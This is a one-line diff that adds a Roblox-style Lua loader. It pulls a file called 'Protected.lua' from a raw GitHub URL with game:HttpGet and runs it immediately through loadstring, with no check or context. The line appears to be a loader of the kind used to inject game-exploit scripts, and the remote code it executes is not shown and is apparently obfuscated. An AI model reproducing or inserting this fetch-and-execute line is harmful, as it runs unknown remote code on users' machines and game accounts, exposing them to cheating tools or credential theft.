@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DEORA2/j67j67j67j6j677j/main/Protected.lua"))()
